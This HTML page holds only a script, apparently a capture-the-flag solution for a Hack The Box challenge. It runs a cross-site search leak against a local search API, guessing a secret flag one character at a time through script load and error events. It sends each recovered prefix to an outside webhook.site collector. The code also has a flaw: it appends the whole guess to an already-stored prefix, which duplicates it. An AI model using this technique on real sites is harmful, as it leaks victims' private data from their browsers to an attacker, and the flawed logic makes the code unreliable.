<!DOCTYPE html>
<body>
    <script>
    var whook = 'https://webhook.site/72848291-db2a-451d-a6d2-47693becab3c/'
    var url = "http://127.0.0.1:1338/api/entries/search?q=";
    var htb = 'HTB';
    var letters = '';
    var FLAG = 'HTB';
    // flag characters
    for(var i=33; i<127; i++){
        letters += String.fromCharCode(i);
    }
        
    async function makeFetchRequest() {
        for(var i=0; i<letters.length; i++){
            await doGuess(FLAG+letters[i]);
        }
    }

        
    async function doGuess(g){
        const script = document.createElement("script");
        script.src = url+g;
        script.onload = () => {
            FLAG += g;
            fetch(whook+FLAG);
            makeFetchRequest();
        };
        script.onerror = () => {fetch(whook+g+'Fail')};
        document.head.appendChild(script);
    }
    makeFetchRequest();

    </script>
</body>
